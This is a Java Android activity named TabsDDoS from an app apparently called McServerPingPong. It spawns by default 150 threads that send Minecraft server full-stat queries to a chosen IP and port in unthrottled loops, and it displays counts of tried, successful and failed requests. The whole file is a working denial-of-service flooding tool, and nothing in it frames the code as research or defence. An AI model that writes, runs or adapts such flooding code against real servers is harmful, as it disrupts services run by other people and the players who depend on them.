package com.nao20010128nao.McServerPingPong;

import android.os.*;
import android.support.v4.app.*;
import android.util.*;
import android.view.*;
import android.widget.*;
import java.lang.ref.*;
import java.math.*;
import java.util.*;
import query.*;

public class TabsDDoS extends FragmentActivity {
	static WeakReference<TabsDDoS> instance=new WeakReference(null);

	volatile BigInteger triedN,successN,failedN;
	Thread status;
	String ip;
	int port;
	long latestUpdate;

	List<Thread> t=new ArrayList<>();
	ListView players,sortedPlayers,data;
	FragmentTabHost fth;
	TabHost.TabSpec playersF,dataF,statusF;
	TextView tried,success,failed;

	ArrayAdapter<String> adap,adap3;
	ArrayAdapter<Map.Entry<String,String>> adap2;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO: Implement this method
		triedN = successN = failedN = BigInteger.ZERO;
		super.onCreate(savedInstanceState);
		instance = new WeakReference(this);

		setContentView(R.layout.tabs);
		fth = (FragmentTabHost)findViewById(android.R.id.tabhost);
		fth.setup(this, getSupportFragmentManager(), R.id.container);

		playersF = fth.newTabSpec("playersList");
		playersF.setIndicator(getResources().getString(R.string.players));
		fth.addTab(playersF, PlayersFragment.class, null);

		dataF = fth.newTabSpec("dataList");
		dataF.setIndicator(getResources().getString(R.string.data));
		fth.addTab(dataF, DataFragment.class, null);

		statusF = fth.newTabSpec("statusScreen");
		statusF.setIndicator(getResources().getString(R.string.status));
		fth.addTab(statusF, StatusFragment.class, null);

		adap = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, new ArrayList<String>());
		adap2 = new ArrayAdapter<Map.Entry<String,String>>(this, 0, new ArrayList<Map.Entry<String,String>>()){
			public View getView(int pos, View v, ViewGroup ignore) {
				if (v == null)
					v = getLayoutInflater().inflate(R.layout.data, null);
				((TextView)v.findViewById(R.id.k)).setText(getItem(pos).getKey());
				((TextView)v.findViewById(R.id.v)).setText(getItem(pos).getValue());
				return v;
			}
		};
		ip = getIntent().getStringExtra("ip");
		port = getIntent().getIntExtra("port", 25565);
		setTitle(ip + ":" + port);
		for (int i=0;i < getIntent().getIntExtra("threads", 150);i++) {
			t.add(new Thread(){
					public void run() {
						Log.d("data", ip + ":" + port);
						MCQuery q=new MCQuery(ip, port);
						while (!Thread.interrupted()) {
							triedN = triedN.add(BigInteger.ONE);
							try {
								QueryResponseUniverse resp=q.fullStatUni();
								update(resp);
								successN = successN.add(BigInteger.ONE);
							} catch (Throwable e) {
								e.printStackTrace();
								failedN = failedN.add(BigInteger.ONE);
							}
						}
						q.finalize();
					}
				});
			t.get(t.size() - 1).start();
		}
		(status = new Thread(){
			public void run() {
				while (!isInterrupted()) {
					try {
						sleep(50);
					} catch (InterruptedException e) {
						return;
					}
					runOnUiThread(new Runnable(){
							public void run() {
								if (tried != null)tried.setText(triedN + "");
								if (success != null)success.setText(successN + "");
								if (failed != null)failed.setText(failedN + "");
							}
						});
				}
			}
		}).start();
	}
	public synchronized void update(final QueryResponseUniverse resp) {
		if ((latestUpdate + 100) > System.currentTimeMillis()) {
			return;
		}
		latestUpdate = System.currentTimeMillis();
		final ArrayList<String> sort=new ArrayList<>(resp.getPlayerList());
		Collections.sort(sort);
		final String title;
		Map<String,String> m=resp.getData();
		if (m.containsKey("hostname")) {
			title = deleteDecorations(m.get("hostname"));
		} else if (m.containsKey("motd")) {
			title = deleteDecorations(m.get("motd"));
		} else {
			title = ip + ":" + port;
		}
		runOnUiThread(new Runnable(){
				public void run() {
					Log.d("data", "updating..");
					adap.clear();
					adap.addAll(sort);
					adap2.clear();
					adap2.addAll(resp.getData().entrySet());
					setTitle(title);
				}
			});
	}
	static void setPlayersView(ListView lv) {
		instance.get().setPlayersView_(lv);
	}
	static void setDataView(ListView lv) {
		instance.get().setDataView_(lv);
	}
	static void setStatusRoot(View v) {
		instance.get().setStatusRoot_(v);
	}

	void setPlayersView_(ListView lv) {
		players = lv;
		lv.setAdapter(adap);
	}
	void setDataView_(ListView lv) {
		data = lv;
		lv.setAdapter(adap2);
	}
	void setStatusRoot_(View v) {
		tried = (TextView)v.findViewById(R.id.tried);
		success = (TextView)v.findViewById(R.id.success);
		failed = (TextView)v.findViewById(R.id.failed);
	}

	@Override
	protected void onDestroy() {
		// TODO: Implement this method
		super.onDestroy();
		for (Thread th:t)
			th.interrupt();
		status.interrupt();
	}

	static String deleteDecorations(String decorated) {
		StringBuilder sb=new StringBuilder();
		char[] chars=decorated.toCharArray();
		int offset=0;
		while (chars.length > offset) {
			if (chars[offset] == '§') {
				offset += 2;
				continue;
			}
			sb.append(chars[offset]);
			offset++;
		}
		Log.d("esc", sb.toString());
		return sb.toString();
	}
	public static class PlayersFragment extends android.support.v4.app.Fragment {
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			// TODO: Implement this method
			ListView lv=(ListView) inflater.inflate(R.layout.ddos_players_tab, null, false);
			setPlayersView(lv);
			return lv;
		}
	}
	public static class DataFragment extends android.support.v4.app.Fragment {
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			// TODO: Implement this method
			ListView lv=(ListView) inflater.inflate(R.layout.ddos_data_tab, null, false);
			setDataView(lv);
			return lv;
		}
	}
	public static class StatusFragment extends android.support.v4.app.Fragment {
		@Override
		public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
			// TODO: Implement this method
			View lv=inflater.inflate(R.layout.status, null, false);
			setStatusRoot(lv);
			return lv;
		}
	}
}
